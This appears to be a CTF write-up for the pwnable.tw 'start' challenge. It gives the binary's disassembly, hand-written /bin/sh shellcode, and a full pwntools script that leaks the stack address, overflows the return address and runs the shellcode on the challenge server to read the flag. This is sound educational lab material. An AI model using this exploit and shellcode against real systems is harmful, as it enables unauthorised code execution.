---
title: "pwnable.tw - start"
date: 2018-12-24 13:45
tags: [pwn]
categories: [pwn]
---
<!--more-->

Let's get some information on this binary.  
```bash
┌─[x0r19x91@syst3m]─[~/Desktop/pwning/start]
└──╼ $ pwn checksec start 
[*] '/home/x0r19x91/Desktop/pwning/start/start'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
```

We can execute code on the stack and PIE is disabled. So, the load address is fixed at 0x8048060. This is great !

```x86asm
08048060 <_start>:
 8048060:	54                   	push   esp
 8048061:	68 9d 80 04 08       	push   0x804809d
 8048066:	31 c0                	xor    eax,eax
 8048068:	31 db                	xor    ebx,ebx
 804806a:	31 c9                	xor    ecx,ecx
 804806c:	31 d2                	xor    edx,edx
 804806e:	68 43 54 46 3a       	push   0x3a465443
 8048073:	68 74 68 65 20       	push   0x20656874
 8048078:	68 61 72 74 20       	push   0x20747261
 804807d:	68 73 20 73 74       	push   0x74732073
 8048082:	68 4c 65 74 27       	push   0x2774654c
 8048087:	89 e1                	mov    ecx,esp
 8048089:	b2 14                	mov    dl,0x14
 804808b:	b3 01                	mov    bl,0x1
 804808d:	b0 04                	mov    al,0x4
 804808f:	cd 80                	int    0x80
 8048091:	31 db                	xor    ebx,ebx
 8048093:	b2 3c                	mov    dl,0x3c
 8048095:	b0 03                	mov    al,0x3
 8048097:	cd 80                	int    0x80
 8048099:	83 c4 14             	add    esp,0x14
 804809c:	c3                   	ret    

0804809d <_exit>:
 804809d:	5c                   	pop    esp
 804809e:	31 c0                	xor    eax,eax
 80480a0:	40                   	inc    eax
 80480a1:	cd 80                	int    0x80
```

The read syscall reads a maximum of 60 bytes, so our shellcode must be atmost 60 bytes. First let's write the shellcode to start a shell.  
```x86asm
    global _start

[ section .text ]

_start:
    jmp short next
back:
    pop ebx
    xor ecx, ecx
    xor edx, edx
    mov al, 11
    int 0x80
next:
    call back
    db '/bin/sh', 0
```

We can put this shellcode on the stack but we need the address of where the shellcode is placed i.e., we need the value of **esp**. Since there is a **write** syscall at **0x804808f** which writes from **esp**, if we modify the return address to **0x8048087**, we can print the value of **saved esp** along with 4 dwords from stack.  
Now, after leaking the **esp**, the **read** syscall is executed once more, reading 60 bytes from **leaked_esp-4**. We write 20 random bytes followed by the return address followed by the shellcode. So, the new return address is **leaked_esp+20**.

Here's the script  
```python
#!/usr/bin/env python2

from pwn import *

r = remote('chall.pwnable.tw', 10000)
payload = "A" * 20
payload += p32(0x8048087)
print r.recv(1024)
r.send(payload)

stack = r.recv(1024)
leak = int(stack[:4][::-1].encode('hex'), 16)
log.info('Leak -> %#08x' % leak)
log.info('Return Address -> %#08x' % (leak+0x14))

payload = "A" * 20 + p32(leak+0x14)
shellcode = "\xeb\x09\x5b\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf2\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00"
r.send(payload+shellcode)
r.sendline('cat /home/start/flag')
log.info('Flag -> %s', r.readline())
r.close()
```

Let's execute it !

```
┌─[x0r19x91@syst3m]─[~/Desktop/pwning/start]
└──╼ $ ./solve.py 
[+] Opening connection to chall.pwnable.tw on port 10000: Done
Let's start the CTF:
[*] Leak -> 0xffb9fa90
[*] Return Address -> 0xffb9faa4
[*] Flag -> FLAG{Pwn4bl3_tW_1s_y0ur_st4rt}
[*] Closed connection to chall.pwnable.tw port 10000
```